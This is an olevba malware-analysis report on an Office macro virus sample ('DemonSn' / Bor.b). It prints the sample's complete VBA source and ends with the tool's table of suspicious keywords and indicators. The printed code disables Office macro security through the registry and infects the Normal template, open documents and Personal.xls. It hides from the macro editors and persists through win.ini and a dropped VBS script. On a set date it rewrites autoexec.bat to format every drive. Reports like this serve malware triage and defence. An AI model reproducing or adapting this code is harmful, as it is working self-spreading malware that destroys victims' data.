olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Bor.b-ec802fe8d9514275ca43559115cb6bfaf59e136f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Bor.b-ec802fe8d9514275ca43559115cb6bfaf59e136f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DemonSn.bas 
in file: Virus.MSOffice.Bor.b-ec802fe8d9514275ca43559115cb6bfaf59e136f - OLE stream: 'Macros/VBA/DemonSn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'MyName = DemonSn.Macro_Format
'WrittenBy = DemonSn from Kz (Ust-Kamenogorsk)
'Version = 1.0

Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCreateKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Const hPath = "SOFTWARE\Microsoft\Office\9.0\"
Const hSec = "\Security"

Sub AutoOpen()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Call WeTrustInGod
If ShowVisualBasicEditor Then Application.Quit
End Sub

Sub Auto_Open()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
Options.VirusProtection = False
Options.ConfirmConversions = False
Application.OnSheetActivate = "Active"
End Sub

Sub Active()
On Error Resume Next
WinDir = Environ("windir")
Personal = "\Personal.xls"
SU = Application.StartupPath
Call WeTrustInGod
If Dir(SU & Personal) = "" Then
ScreenUpdating = False
Call Hide
Kill WinDir & "\Dmnsn.dll"
ActiveWorkbook.VBProject.VBComponents("DemonSn").Export WinDir & "\Dmnsn.dll"
Workbooks.Add xlWBATWorksheet
NewBook = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks(NewBook).VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
Workbooks(NewBook).SaveAs SU & Personal
Application.OnSheetActivate = "Personal.xls!Active"
ScreenUpdating = True
ExitWindowsEx 6, 0
Else
If ActiveWorkbook.VBProject.VBComponents("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
ActiveWorkbook.VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
End If
End If
End Sub

Sub WeTrustInGod()
On Error Resume Next
Bat = "C:\Autoexec.bat"
If Day(Date) = 21 Then
SetAttr Dat, vbNormal
Kill Bat
Open Bat For Output As #2
Print #2, "@echo off"
For I = 99 To 122
Print #2, "format " & Chr(I) & ": /autotest /q > nul"
Next I
Print #2, "format a: /autotest /q > nul"
Print #2, "format b: /autotest /q > nul"
Print #2, "cls"
For I = 0 To 9
Print #2, "echo."
Next I
Print #2, "echo                              DemonSn Virus !!!"
Close #2
ExitWindowsEx 6, 0
End If
End Sub

Sub AutoClose()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
Call WeTrustInGod
WinDir = Environ("windir")
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Call Hide
If NormalTemplate.VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
NormalTemplate.VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
NormalTemplate.Save
ExitWindowsEx 6, 0
End If
If ActiveDocument.VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
ActiveDocument.VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Call AutoClose
End Sub

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call FileSave
End Sub

Sub ToolsMacro()
On Error Resume Next
WinDir = Environ("windir")
Call Hide
For X = 1 To NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines - 1
CodeNT = CodeNT & NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
NormalTemplate.Saved = True
If Documents.Count >= 1 Then
For Y = 1 To ActiveDocument.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines - 1
CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("DemonSn").CodeModule.Lines(Y, 1) & Chr(13)
Next Y
For X = 1 To Documents.Count
Documents(X).VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
Documents(X).Saved = True
Next X
End If
Dialogs(wdDialogToolsMacro).Show
If Not ShowVisualBasicEditor Then
NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.InsertLines 1, CodeNT
NormalTemplate.Save
If NormalTemplate.VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
NormalTemplate.VBProject.VBComponents.Import (WinDir & "\Dmnsn.dll")
NormalTemplate.Save
End If
If Documents.Count >= 1 Then
For X = 1 To Documents.Count
Documents(X).VBProject.VBComponents("DemonSn").CodeModule.InsertLines 1, CodeAD
Documents(X).SaveAs Documents(X).FullName
If Documents(X).VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
Documents(X).VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
Documents(X).SaveAs Documents(X).FullName
End If
Next X
End If
End If
End Sub

Sub ViewVBCode()
On Error Resume Next
Call Hide
NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("DemonSn")
NormalTemplate.Saved = True
If Application.Documents.Count >= 1 Then
For X = 1 To Application.Documents.Count
Documents(X).VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
Documents(X).Saved = True
Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("DemonSn")
Documents(X).Saved = True
Next X
End If
Application.ShowVisualBasicEditor = True
End Sub

Sub Sec(ByVal N As String)
On Error Resume Next
Level& = 1
RegCreateKeyExA &H80000001, hPath & N & hSec, 0, "", 0, 0, 0, hKey, 2
RegSetValueExA hKey, "Level", 0, 4, Level, 4
End Sub

Sub Hide()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
WinDir = Environ("windir")
Kill (WinDir & "\Dmnsn.dll")
ActiveDocument.VBProject.VBComponents("DemonSn").Export (WinDir & "\Dmnsn.dll")
NormalTemplate.VBProject.VBComponents("DemonSn").Export (WinDir & "\Dmnsn.dll")
WinDir = Environ("windir")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "The DemonSn"
Open WinDir & "\Win.ini" For Input As #1
Infected = False
Do While Not EOF(1)
Line Input #1, Line
If Line = "Run=DemonSn.vbs" Then Infected = True
Loop
Close #1
If Not Infected Then
Open WinDir & "\win.ini" For Input As #1
Open "c:\Win._ni" For Output As #2
Do While Not EOF(1)
Line Input #1, Line
If Line = "[windows]" Then
Print #2, Line
Print #2, "Run=DemonSn.vbs"
Else
Print #2, Line
End If
Loop
Close #1
Close #2
End If
FileCopy "c:\win._ni", WinDir & "\Win.ini"
Kill "c:\win._ni"
Kill WinDir & "\DemonSn.vbs"
Open WinDir & "\DemonSn.vbs" For Append As #1
Print #1, "On Error Resume Next"
Print #1, "Set Word = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Word.Options.SaveNormalPrompt = False"
Print #1, "Word.NormalTemplate.VBProject.VBComponents.Remove Word.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "DemonSn" & Chr(34) & ")"
Print #1, "Word.NormalTemplate.VBProject.VBComponents.Import (" & Chr(34) & WinDir & "\Dmnsn.dll" & Chr(34) & ")"
Print #1, "Word.NormalTemplate.Save"
Print #1, "Word.Quit"
Print #1, "Set ExcelObj = CreateObject(" & Chr(34) & "Excel.Application" & Chr(34) & ")"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "FSO.DeleteFile ExcelObj.StartupPath & " & Chr(34) & "\Personal.xls" & Chr(34)
Print #1, "ExcelObj.Workbooks.Add 1"
Print #1, "ExcelObj.Workbooks(1).VBProject.VBComponents.Import (" & Chr(34) & WinDir & "\Dmnsn.dll" & Chr(34) & ")"
Print #1, "ExcelObj.ActiveWindow.Visible = False"
Print #1, "ExcelObj.OnSheetActivate = " & Chr(34) & "Personal.xls!Active" & Chr(34)
Print #1, "ExcelObj.Workbooks(1).SaveAs ExcelObj.StartupPath & " & Chr(34) & "\Personal.xls" & Chr(34)
Print #1, "ExcelObj.Quit"
Close #1
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |Dmnsn.dll           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |DemonSn.vbs         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
